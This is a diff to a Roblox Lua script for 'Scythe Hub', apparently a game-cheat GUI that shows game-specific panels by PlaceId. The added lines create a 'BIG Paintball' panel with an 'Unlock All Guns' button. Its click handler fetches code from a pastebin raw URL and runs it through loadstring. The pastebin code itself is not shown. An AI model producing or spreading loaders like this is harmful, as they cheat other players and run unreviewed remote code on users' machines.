@@ -1,9 +1,7 @@
 
 
---[[
-	Credits To Other Gui Makers
 
-]]
+--Credits To Other Gui Makers
 
 
 
@@ -12,6 +10,17 @@
 
 
 
+
+
+
+
+
+
+
+
+
+
+--Converted with ttyyuu12345's model to script plugin v4
 function sandbox(var,func)
 	local env = getfenv(func)
 	local newenv = setmetatable({},{
@@ -127,6 +136,10 @@ TextButton95 = Instance.new("TextButton")
 LocalScript96 = Instance.new("LocalScript")
 TextButton97 = Instance.new("TextButton")
 LocalScript98 = Instance.new("LocalScript")
+Frame99 = Instance.new("Frame")
+TextLabel100 = Instance.new("TextLabel")
+TextButton101 = Instance.new("TextButton")
+LocalScript102 = Instance.new("LocalScript")
 ScreenGui0.Name = "Scythe Hub"
 ScreenGui0.Parent = mas
 ScreenGui0.ResetOnSpawn = false
@@ -248,6 +261,12 @@ if game.PlaceId == 418574428 then
 	
 	if game.PlaceId == 5118969548 then
 	script.Parent.Spider.Visible = true
+	
+		script.Parent.NotDetected.Visible = false
+	end
+	
+	if game.PlaceId == 3527629287 then
+	script.Parent.BigPaintball.Visible = true
 	
 		script.Parent.NotDetected.Visible = false
 end
@@ -4715,6 +4734,52 @@ LocalScript98.Parent = TextButton97
 table.insert(cors,sandbox(LocalScript98,function()
 script.Parent.MouseButton1Click:Connect(function()
 	script.Parent.Parent.TP.Visible = true
+end)
+end))
+Frame99.Name = "BigPaintball"
+Frame99.Parent = Frame1
+Frame99.Position = UDim2.new(-0.00191390922, 0, 0.151057407, 0)
+Frame99.Visible = false
+Frame99.Size = UDim2.new(0, 414, 0, 281)
+Frame99.BackgroundColor = BrickColor.new("Really black")
+Frame99.BackgroundColor3 = Color3.new(0, 0, 0)
+Frame99.BorderSizePixel = 0
+Frame99.ZIndex = 5
+TextLabel100.Name = "title"
+TextLabel100.Parent = Frame99
+TextLabel100.Position = UDim2.new(0, 0, 0.0249110311, 0)
+TextLabel100.Size = UDim2.new(0, 414, 0, 50)
+TextLabel100.BackgroundColor = BrickColor.new("Institutional white")
+TextLabel100.BackgroundColor3 = Color3.new(1, 1, 1)
+TextLabel100.BackgroundTransparency = 1
+TextLabel100.ZIndex = 5
+TextLabel100.Font = Enum.Font.SourceSans
+TextLabel100.FontSize = Enum.FontSize.Size36
+TextLabel100.Text = "BIG Paintball Has Been Detected"
+TextLabel100.TextColor = BrickColor.new("Royal purple")
+TextLabel100.TextColor3 = Color3.new(0.321569, 0.113725, 1)
+TextLabel100.TextSize = 35
+TextLabel100.TextWrap = true
+TextLabel100.TextWrapped = true
+TextButton101.Parent = Frame99
+TextButton101.Position = UDim2.new(0.231884062, 0, 0.320641875, 0)
+TextButton101.Size = UDim2.new(0, 225, 0, 91)
+TextButton101.BackgroundColor = BrickColor.new("Royal purple")
+TextButton101.BackgroundColor3 = Color3.new(0.321569, 0.113725, 1)
+TextButton101.ZIndex = 5
+TextButton101.Font = Enum.Font.SourceSans
+TextButton101.FontSize = Enum.FontSize.Size14
+TextButton101.Text = "Unlock All Guns"
+TextButton101.TextColor = BrickColor.new("Really black")
+TextButton101.TextColor3 = Color3.new(0, 0, 0)
+TextButton101.TextScaled = true
+TextButton101.TextSize = 14
+TextButton101.TextWrap = true
+TextButton101.TextWrapped = true
+LocalScript102.Parent = TextButton101
+table.insert(cors,sandbox(LocalScript102,function()
+script.Parent.MouseButton1Click:Connect(function()
+	loadstring(game.HttpGet(game, "https://pastebin.com/raw/EjikdmZx")) ()
 end)
 end))
 for i,v in pairs(mas:GetChildren()) do
